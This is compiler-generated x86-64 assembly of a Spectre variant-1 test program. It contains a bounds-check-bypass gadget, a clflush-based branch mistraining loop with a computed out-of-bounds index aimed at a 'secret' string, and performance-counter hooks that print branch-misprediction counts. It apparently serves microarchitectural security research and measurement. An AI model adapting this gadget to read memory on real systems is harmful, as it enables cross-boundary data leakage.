	.file	"spectre_stage1_2_auto.c"
	.text
.Ltext0:
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.comm	unused1,64,32
	.globl	array1
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	unused2,64,32
	.comm	array2,131072,32
	.globl	secret
	.section	.rodata
.LC0:
	.string	"Y"
	.section	.data.rel.local,"aw",@progbits
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	spectre_function
	.type	spectre_function, @function
spectre_function:
.LFB3923:
	.file 1 "spectre_stage1_2_auto.c"
	.loc 1 58 0
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	.loc 1 60 0
	call	pmu_uops_snap_before@PLT
	.loc 1 62 0
#APP
# 62 "spectre_stage1_2_auto.c" 1
	.globl STAGE1_BEGIN
STAGE1_BEGIN:
# 0 "" 2
	.loc 1 63 0
#NO_APP
	movl	array1_size(%rip), %eax
	movl	%eax, %eax
	cmpq	%rax, -8(%rbp)
	jnb	.L2
	.loc 1 64 0
#APP
# 64 "spectre_stage1_2_auto.c" 1
	# NOP_REGION_BEGIN
# 0 "" 2
	.loc 1 65 0
#NO_APP
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	movslq	%eax, %rdx
	leaq	array2(%rip), %rax
	movzbl	(%rdx,%rax), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
	.loc 1 66 0
#APP
# 66 "spectre_stage1_2_auto.c" 1
	# NOP_REGION_END
# 0 "" 2
#NO_APP
.L2:
	.loc 1 68 0
#APP
# 68 "spectre_stage1_2_auto.c" 1
	.globl STAGE1_END
STAGE1_END:
# 0 "" 2
	.loc 1 70 0
#NO_APP
	call	pmu_uops_snap_after@PLT
	.loc 1 71 0
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3923:
	.size	spectre_function, .-spectre_function
	.globl	vf_get_probe_addr_for_secret
	.type	vf_get_probe_addr_for_secret, @function
vf_get_probe_addr_for_secret:
.LFB3924:
	.loc 1 80 0
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, %eax
	movb	%al, -4(%rbp)
	.loc 1 81 0
	movzbl	-4(%rbp), %eax
	salq	$9, %rax
	movq	%rax, %rdx
	leaq	array2(%rip), %rax
	addq	%rdx, %rax
	.loc 1 82 0
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3924:
	.size	vf_get_probe_addr_for_secret, .-vf_get_probe_addr_for_secret
	.globl	stage1_mistrain_trigger
	.type	stage1_mistrain_trigger, @function
stage1_mistrain_trigger:
.LFB3925:
	.loc 1 88 0
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%rdi, -40(%rbp)
	.loc 1 92 0
	movl	$29, -28(%rbp)
	jmp	.L6
.L9:
	.loc 1 93 0
	movl	-28(%rbp), %eax
	cltd
	shrl	$28, %edx
	addl	%edx, %eax
	andl	$15, %eax
	subl	%edx, %eax
	cltq
	movq	%rax, -24(%rbp)
	leaq	array1_size(%rip), %rax
	movq	%rax, -8(%rbp)
.LBB5:
.LBB6:
	.file 2 "/usr/lib/gcc/x86_64-linux-gnu/7/include/emmintrin.h"
	.loc 2 1486 0
	movq	-8(%rbp), %rax
	clflush	(%rax)
.LBE6:
.LBE5:
.LBB7:
	.loc 1 95 0
	movl	$0, -32(%rbp)
	jmp	.L7
.L8:
	.loc 1 95 0 is_stmt 0 discriminator 3
	movl	-32(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -32(%rbp)
.L7:
	.loc 1 95 0 discriminator 1
	movl	-32(%rbp), %eax
	cmpl	$199, %eax
	jle	.L8
.LBE7:
	.loc 1 97 0 is_stmt 1 discriminator 2
	movl	-28(%rbp), %ecx
	movl	$715827883, %edx
	movl	%ecx, %eax
	imull	%edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -16(%rbp)
	.loc 1 98 0 discriminator 2
	movq	-16(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -16(%rbp)
	.loc 1 99 0 discriminator 2
	movq	-40(%rbp), %rax
	xorq	-24(%rbp), %rax
	andq	-16(%rbp), %rax
	xorq	-24(%rbp), %rax
	movq	%rax, -16(%rbp)
	.loc 1 101 0 discriminator 2
	movq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	spectre_function
	.loc 1 92 0 discriminator 2
	subl	$1, -28(%rbp)
.L6:
	.loc 1 92 0 is_stmt 0 discriminator 1
	cmpl	$0, -28(%rbp)
	jns	.L9
	.loc 1 103 0 is_stmt 1
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3925:
	.size	stage1_mistrain_trigger, .-stage1_mistrain_trigger
	.globl	vf_run_attack_once
	.type	vf_run_attack_once, @function
vf_run_attack_once:
.LFB3926:
	.loc 1 105 0
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	.loc 1 106 0
	movq	secret(%rip), %rax
	movq	%rax, %rdx
	leaq	array1(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -8(%rbp)
	.loc 1 107 0
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	stage1_mistrain_trigger
	.loc 1 108 0
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3926:
	.size	vf_run_attack_once, .-vf_run_attack_once
	.globl	vf_prepare_probe_region
	.type	vf_prepare_probe_region, @function
vf_prepare_probe_region:
.LFB3927:
	.loc 1 110 0
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$24, %rsp
	movl	%edi, -20(%rbp)
	.loc 1 111 0
	cmpl	$0, -20(%rbp)
	jle	.L12
	.loc 1 111 0 is_stmt 0 discriminator 1
	cmpl	$256, -20(%rbp)
	jle	.L13
.L12:
	.loc 1 112 0 is_stmt 1
	movl	$256, -20(%rbp)
.L13:
.LBB8:
	.loc 1 114 0
	movl	$0, -12(%rbp)
	jmp	.L14
.L15:
.LBB9:
	.loc 1 115 0 discriminator 3
	movl	-12(%rbp), %eax
	movzbl	%al, %eax
	movl	%eax, %edi
	call	vf_get_probe_addr_for_secret
	movq	%rax, -8(%rbp)
	.loc 1 116 0 discriminator 3
	movq	-8(%rbp), %rax
	movb	$1, (%rax)
.LBE9:
	.loc 1 114 0 discriminator 3
	addl	$1, -12(%rbp)
.L14:
	.loc 1 114 0 is_stmt 0 discriminator 1
	movl	-12(%rbp), %eax
	cmpl	-20(%rbp), %eax
	jl	.L15
.LBE8:
	.loc 1 118 0 is_stmt 1
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3927:
	.size	vf_prepare_probe_region, .-vf_prepare_probe_region
	.section	.rodata
	.align 8
.LC1:
	.string	"STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB3928:
	.loc 1 124 0
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	.loc 1 125 0
	movq	secret(%rip), %rax
	movq	%rax, %rdx
	leaq	array1(%rip), %rax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -8(%rbp)
	.loc 1 129 0
	movl	$0, -16(%rbp)
	jmp	.L17
.L18:
	.loc 1 130 0 discriminator 3
	movl	-16(%rbp), %eax
	movslq	%eax, %rdx
	leaq	array2(%rip), %rax
	movb	$1, (%rdx,%rax)
	.loc 1 129 0 discriminator 3
	addl	$1, -16(%rbp)
.L17:
	.loc 1 129 0 is_stmt 0 discriminator 1
	cmpl	$131071, -16(%rbp)
	jle	.L18
	.loc 1 134 0 is_stmt 1
	movq	-8(%rbp), %rax
	movq	%rax, %rdi
	call	stage1_mistrain_trigger
.LBB10:
	.loc 1 138 0
	call	pmu_stage1_get_count@PLT
	movl	%eax, -12(%rbp)
	.loc 1 139 0
	movl	$0, -16(%rbp)
	jmp	.L19
.L20:
	.loc 1 142 0 discriminator 3
	movl	-16(%rbp), %eax
	movl	%eax, %edi
	call	pmu_stage1_get_delta@PLT
	movq	%rax, %rdx
	.loc 1 140 0 discriminator 3
	movl	-16(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC1(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	.loc 1 139 0 discriminator 3
	addl	$1, -16(%rbp)
.L19:
	.loc 1 139 0 is_stmt 0 discriminator 1
	movl	-16(%rbp), %eax
	cmpl	-12(%rbp), %eax
	jl	.L20
.LBE10:
	.loc 1 147 0 is_stmt 1
	call	pmu_uops_print_results@PLT
	.loc 1 149 0
	movl	$0, %eax
	.loc 1 150 0
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3928:
	.size	main, .-main
.Letext0:
	.file 3 "/usr/include/x86_64-linux-gnu/bits/types.h"
	.file 4 "/usr/include/x86_64-linux-gnu/bits/stdint-uintn.h"
	.file 5 "/usr/lib/gcc/x86_64-linux-gnu/7/include/stddef.h"
	.file 6 "/usr/include/x86_64-linux-gnu/bits/libio.h"
	.file 7 "/usr/include/stdio.h"
	.file 8 "/usr/include/x86_64-linux-gnu/bits/sys_errlist.h"
	.section	.debug_info,"",@progbits
.Ldebug_info0:
	.long	0x61d
	.value	0x4
	.long	.Ldebug_abbrev0
	.byte	0x8
	.uleb128 0x1
	.long	.LASF77
	.byte	0xc
	.long	.LASF78
	.long	.LASF79
	.quad	.Ltext0
	.quad	.Letext0-.Ltext0
	.long	.Ldebug_line0
	.uleb128 0x2
	.byte	0x1
	.byte	0x8
	.long	.LASF0
	.uleb128 0x2
	.byte	0x2
	.byte	0x7
	.long	.LASF1
	.uleb128 0x2
	.byte	0x4
	.byte	0x7
	.long	.LASF2
	.uleb128 0x2
	.byte	0x8
	.byte	0x7
	.long	.LASF3
	.uleb128 0x2
	.byte	0x1
	.byte	0x6
	.long	.LASF4
	.uleb128 0x3
	.long	.LASF7
	.byte	0x3
	.byte	0x25
	.long	0x2d
	.uleb128 0x2
	.byte	0x2
	.byte	0x5
	.long	.LASF5
	.uleb128 0x4
	.byte	0x4
	.byte	0x5
	.string	"int"
	.uleb128 0x5
	.long	0x62
	.uleb128 0x2
	.byte	0x8
	.byte	0x5
	.long	.LASF6
	.uleb128 0x3
	.long	.LASF8
	.byte	0x3
	.byte	0x8c
	.long	0x6e
	.uleb128 0x3
	.long	.LASF9
	.byte	0x3
	.byte	0x8d
	.long	0x6e
	.uleb128 0x6
	.byte	0x8
	.uleb128 0x7
	.byte	0x8
	.long	0x93
	.uleb128 0x2
	.byte	0x1
	.byte	0x6
	.long	.LASF10
	.uleb128 0x8
	.long	0x93
	.uleb128 0x3
	.long	.LASF11
	.byte	0x4
	.byte	0x18
	.long	0x50
	.uleb128 0x5
	.long	0x9f
	.uleb128 0x3
	.long	.LASF12
	.byte	0x5
	.byte	0xd8
	.long	0x42
	.uleb128 0x9
	.long	.LASF42
	.byte	0xd8
	.byte	0x6
	.byte	0xf5
	.long	0x23a
	.uleb128 0xa
	.long	.LASF13
	.byte	0x6
	.byte	0xf6
	.long	0x62
	.byte	0
	.uleb128 0xa
	.long	.LASF14
	.byte	0x6
	.byte	0xfb
	.long	0x8d
	.byte	0x8
	.uleb128 0xa
	.long	.LASF15
	.byte	0x6
	.byte	0xfc
	.long	0x8d
	.byte	0x10
	.uleb128 0xa
	.long	.LASF16
	.byte	0x6
	.byte	0xfd
	.long	0x8d
	.byte	0x18
	.uleb128 0xa
	.long	.LASF17
	.byte	0x6
	.byte	0xfe
	.long	0x8d
	.byte	0x20
	.uleb128 0xa
	.long	.LASF18
	.byte	0x6
	.byte	0xff
	.long	0x8d
	.byte	0x28
	.uleb128 0xb
	.long	.LASF19
	.byte	0x6
	.value	0x100
	.long	0x8d
	.byte	0x30
	.uleb128 0xb
	.long	.LASF20
	.byte	0x6
	.value	0x101
	.long	0x8d
	.byte	0x38
	.uleb128 0xb
	.long	.LASF21
	.byte	0x6
	.value	0x102
	.long	0x8d
	.byte	0x40
	.uleb128 0xb
	.long	.LASF22
	.byte	0x6
	.value	0x104
	.long	0x8d
	.byte	0x48
	.uleb128 0xb
	.long	.LASF23
	.byte	0x6
	.value	0x105
	.long	0x8d
	.byte	0x50
	.uleb128 0xb
	.long	.LASF24
	.byte	0x6
	.value	0x106
	.long	0x8d
	.byte	0x58
	.uleb128 0xb
	.long	.LASF25
	.byte	0x6
	.value	0x108
	.long	0x272
	.byte	0x60
	.uleb128 0xb
	.long	.LASF26
	.byte	0x6
	.value	0x10a
	.long	0x278
	.byte	0x68
	.uleb128 0xb
	.long	.LASF27
	.byte	0x6
	.value	0x10c
	.long	0x62
	.byte	0x70
	.uleb128 0xb
	.long	.LASF28
	.byte	0x6
	.value	0x110
	.long	0x62
	.byte	0x74
	.uleb128 0xb
	.long	.LASF29
	.byte	0x6
	.value	0x112
	.long	0x75
	.byte	0x78
	.uleb128 0xb
	.long	.LASF30
	.byte	0x6
	.value	0x116
	.long	0x34
	.byte	0x80
	.uleb128 0xb
	.long	.LASF31
	.byte	0x6
	.value	0x117
	.long	0x49
	.byte	0x82
	.uleb128 0xb
	.long	.LASF32
	.byte	0x6
	.value	0x118
	.long	0x27e
	.byte	0x83
	.uleb128 0xb
	.long	.LASF33
	.byte	0x6
	.value	0x11c
	.long	0x28e
	.byte	0x88
	.uleb128 0xb
	.long	.LASF34
	.byte	0x6
	.value	0x125
	.long	0x80
	.byte	0x90
	.uleb128 0xb
	.long	.LASF35
	.byte	0x6
	.value	0x12d
	.long	0x8b
	.byte	0x98
	.uleb128 0xb
	.long	.LASF36
	.byte	0x6
	.value	0x12e
	.long	0x8b
	.byte	0xa0
	.uleb128 0xb
	.long	.LASF37
	.byte	0x6
	.value	0x12f
	.long	0x8b
	.byte	0xa8
	.uleb128 0xb
	.long	.LASF38
	.byte	0x6
	.value	0x130
	.long	0x8b
	.byte	0xb0
	.uleb128 0xb
	.long	.LASF39
	.byte	0x6
	.value	0x132
	.long	0xaf
	.byte	0xb8
	.uleb128 0xb
	.long	.LASF40
	.byte	0x6
	.value	0x133
	.long	0x62
	.byte	0xc0
	.uleb128 0xb
	.long	.LASF41
	.byte	0x6
	.value	0x135
	.long	0x294
	.byte	0xc4
	.byte	0
	.uleb128 0xc
	.long	.LASF80
	.byte	0x6
	.byte	0x9a
	.uleb128 0x9
	.long	.LASF43
	.byte	0x18
	.byte	0x6
	.byte	0xa0
	.long	0x272
	.uleb128 0xa
	.long	.LASF44
	.byte	0x6
	.byte	0xa1
	.long	0x272
	.byte	0
	.uleb128 0xa
	.long	.LASF45
	.byte	0x6
	.byte	0xa2
	.long	0x278
	.byte	0x8
	.uleb128 0xa
	.long	.LASF46
	.byte	0x6
	.byte	0xa6
	.long	0x62
	.byte	0x10
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0x241
	.uleb128 0x7
	.byte	0x8
	.long	0xba
	.uleb128 0xd
	.long	0x93
	.long	0x28e
	.uleb128 0xe
	.long	0x42
	.byte	0
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0x23a
	.uleb128 0xd
	.long	0x93
	.long	0x2a4
	.uleb128 0xe
	.long	0x42
	.byte	0x13
	.byte	0
	.uleb128 0xf
	.long	.LASF81
	.uleb128 0x10
	.long	.LASF47
	.byte	0x6
	.value	0x13f
	.long	0x2a4
	.uleb128 0x10
	.long	.LASF48
	.byte	0x6
	.value	0x140
	.long	0x2a4
	.uleb128 0x10
	.long	.LASF49
	.byte	0x6
	.value	0x141
	.long	0x2a4
	.uleb128 0x7
	.byte	0x8
	.long	0x9a
	.uleb128 0x8
	.long	0x2cd
	.uleb128 0x11
	.long	.LASF50
	.byte	0x7
	.byte	0x87
	.long	0x278
	.uleb128 0x11
	.long	.LASF51
	.byte	0x7
	.byte	0x88
	.long	0x278
	.uleb128 0x11
	.long	.LASF52
	.byte	0x7
	.byte	0x89
	.long	0x278
	.uleb128 0x11
	.long	.LASF53
	.byte	0x8
	.byte	0x1a
	.long	0x62
	.uleb128 0xd
	.long	0x2d3
	.long	0x30f
	.uleb128 0x12
	.byte	0
	.uleb128 0x8
	.long	0x304
	.uleb128 0x11
	.long	.LASF54
	.byte	0x8
	.byte	0x1b
	.long	0x30f
	.uleb128 0x2
	.byte	0x8
	.byte	0x5
	.long	.LASF55
	.uleb128 0x2
	.byte	0x4
	.byte	0x4
	.long	.LASF56
	.uleb128 0x2
	.byte	0x8
	.byte	0x7
	.long	.LASF57
	.uleb128 0x7
	.byte	0x8
	.long	0x33a
	.uleb128 0x13
	.uleb128 0x2
	.byte	0x8
	.byte	0x4
	.long	.LASF58
	.uleb128 0x14
	.long	.LASF59
	.byte	0x1
	.byte	0x16
	.long	0x3b
	.uleb128 0x9
	.byte	0x3
	.quad	array1_size
	.uleb128 0xd
	.long	0x9f
	.long	0x367
	.uleb128 0xe
	.long	0x42
	.byte	0x3f
	.byte	0
	.uleb128 0x14
	.long	.LASF60
	.byte	0x1
	.byte	0x17
	.long	0x357
	.uleb128 0x9
	.byte	0x3
	.quad	unused1
	.uleb128 0xd
	.long	0x9f
	.long	0x38c
	.uleb128 0xe
	.long	0x42
	.byte	0x9f
	.byte	0
	.uleb128 0x14
	.long	.LASF61
	.byte	0x1
	.byte	0x18
	.long	0x37c
	.uleb128 0x9
	.byte	0x3
	.quad	array1
	.uleb128 0x14
	.long	.LASF62
	.byte	0x1
	.byte	0x1f
	.long	0x357
	.uleb128 0x9
	.byte	0x3
	.quad	unused2
	.uleb128 0xd
	.long	0x9f
	.long	0x3c9
	.uleb128 0x15
	.long	0x42
	.long	0x1ffff
	.byte	0
	.uleb128 0x14
	.long	.LASF63
	.byte	0x1
	.byte	0x20
	.long	0x3b6
	.uleb128 0x9
	.byte	0x3
	.quad	array2
	.uleb128 0x14
	.long	.LASF64
	.byte	0x1
	.byte	0x25
	.long	0x8d
	.uleb128 0x9
	.byte	0x3
	.quad	secret
	.uleb128 0x14
	.long	.LASF65
	.byte	0x1
	.byte	0x26
	.long	0x9f
	.uleb128 0x9
	.byte	0x3
	.quad	temp
	.uleb128 0x16
	.long	.LASF74
	.byte	0x1
	.byte	0x7c
	.long	0x62
	.quad	.LFB3928
	.quad	.LFE3928-.LFB3928
	.uleb128 0x1
	.byte	0x9c
	.long	0x47e
	.uleb128 0x17
	.long	.LASF66
	.byte	0x1
	.byte	0x7c
	.long	0x62
	.uleb128 0x2
	.byte	0x91
	.sleb128 -36
	.uleb128 0x17
	.long	.LASF67
	.byte	0x1
	.byte	0x7c
	.long	0x47e
	.uleb128 0x2
	.byte	0x91
	.sleb128 -48
	.uleb128 0x18
	.long	.LASF68
	.byte	0x1
	.byte	0x7d
	.long	0xaf
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.uleb128 0x19
	.string	"i"
	.byte	0x1
	.byte	0x7e
	.long	0x62
	.uleb128 0x2
	.byte	0x91
	.sleb128 -32
	.uleb128 0x1a
	.quad	.LBB10
	.quad	.LBE10-.LBB10
	.uleb128 0x19
	.string	"n"
	.byte	0x1
	.byte	0x8a
	.long	0x62
	.uleb128 0x2
	.byte	0x91
	.sleb128 -28
	.byte	0
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0x2cd
	.uleb128 0x1b
	.long	.LASF70
	.byte	0x1
	.byte	0x6e
	.quad	.LFB3927
	.quad	.LFE3927-.LFB3927
	.uleb128 0x1
	.byte	0x9c
	.long	0x4ec
	.uleb128 0x17
	.long	.LASF69
	.byte	0x1
	.byte	0x6e
	.long	0x62
	.uleb128 0x2
	.byte	0x91
	.sleb128 -36
	.uleb128 0x1a
	.quad	.LBB8
	.quad	.LBE8-.LBB8
	.uleb128 0x19
	.string	"i"
	.byte	0x1
	.byte	0x72
	.long	0x62
	.uleb128 0x2
	.byte	0x91
	.sleb128 -28
	.uleb128 0x1a
	.quad	.LBB9
	.quad	.LBE9-.LBB9
	.uleb128 0x19
	.string	"p"
	.byte	0x1
	.byte	0x73
	.long	0x4ec
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0xaa
	.uleb128 0x1b
	.long	.LASF71
	.byte	0x1
	.byte	0x69
	.quad	.LFB3926
	.quad	.LFE3926-.LFB3926
	.uleb128 0x1
	.byte	0x9c
	.long	0x51e
	.uleb128 0x18
	.long	.LASF68
	.byte	0x1
	.byte	0x6a
	.long	0xaf
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.uleb128 0x1b
	.long	.LASF72
	.byte	0x1
	.byte	0x58
	.quad	.LFB3925
	.quad	.LFE3925-.LFB3925
	.uleb128 0x1
	.byte	0x9c
	.long	0x5b2
	.uleb128 0x17
	.long	.LASF68
	.byte	0x1
	.byte	0x58
	.long	0xaf
	.uleb128 0x2
	.byte	0x91
	.sleb128 -56
	.uleb128 0x19
	.string	"j"
	.byte	0x1
	.byte	0x59
	.long	0x62
	.uleb128 0x2
	.byte	0x91
	.sleb128 -44
	.uleb128 0x18
	.long	.LASF73
	.byte	0x1
	.byte	0x5a
	.long	0xaf
	.uleb128 0x2
	.byte	0x91
	.sleb128 -40
	.uleb128 0x19
	.string	"x"
	.byte	0x1
	.byte	0x5a
	.long	0xaf
	.uleb128 0x2
	.byte	0x91
	.sleb128 -32
	.uleb128 0x1c
	.quad	.LBB7
	.quad	.LBE7-.LBB7
	.long	0x591
	.uleb128 0x19
	.string	"z"
	.byte	0x1
	.byte	0x5f
	.long	0x69
	.uleb128 0x2
	.byte	0x91
	.sleb128 -48
	.byte	0
	.uleb128 0x1d
	.long	0x60a
	.quad	.LBB5
	.quad	.LBE5-.LBB5
	.byte	0x1
	.byte	0x5e
	.uleb128 0x1e
	.long	0x613
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.byte	0
	.uleb128 0x1f
	.long	.LASF75
	.byte	0x1
	.byte	0x50
	.long	0x4ec
	.quad	.LFB3924
	.quad	.LFE3924-.LFB3924
	.uleb128 0x1
	.byte	0x9c
	.long	0x5e0
	.uleb128 0x20
	.string	"s"
	.byte	0x1
	.byte	0x50
	.long	0x9f
	.uleb128 0x2
	.byte	0x91
	.sleb128 -20
	.byte	0
	.uleb128 0x1b
	.long	.LASF76
	.byte	0x1
	.byte	0x3a
	.quad	.LFB3923
	.quad	.LFE3923-.LFB3923
	.uleb128 0x1
	.byte	0x9c
	.long	0x60a
	.uleb128 0x20
	.string	"x"
	.byte	0x1
	.byte	0x3a
	.long	0xaf
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.uleb128 0x21
	.long	.LASF82
	.byte	0x2
	.value	0x5cc
	.byte	0x3
	.uleb128 0x22
	.string	"__A"
	.byte	0x2
	.value	0x5cc
	.long	0x334
	.byte	0
	.byte	0
	.section	.debug_abbrev,"",@progbits
.Ldebug_abbrev0:
	.uleb128 0x1
	.uleb128 0x11
	.byte	0x1
	.uleb128 0x25
	.uleb128 0xe
	.uleb128 0x13
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x1b
	.uleb128 0xe
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x10
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x2
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.byte	0
	.byte	0
	.uleb128 0x3
	.uleb128 0x16
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x4
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0x8
	.byte	0
	.byte	0
	.uleb128 0x5
	.uleb128 0x35
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x6
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x7
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x8
	.uleb128 0x26
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x9
	.uleb128 0x13
	.byte	0x1
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xa
	.uleb128 0xd
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x38
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xb
	.uleb128 0xd
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x38
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xc
	.uleb128 0x16
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xd
	.uleb128 0x1
	.byte	0x1
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xe
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xf
	.uleb128 0x13
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x10
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x11
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x12
	.uleb128 0x21
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x13
	.uleb128 0x26
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x14
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x15
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0x6
	.byte	0
	.byte	0
	.uleb128 0x16
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
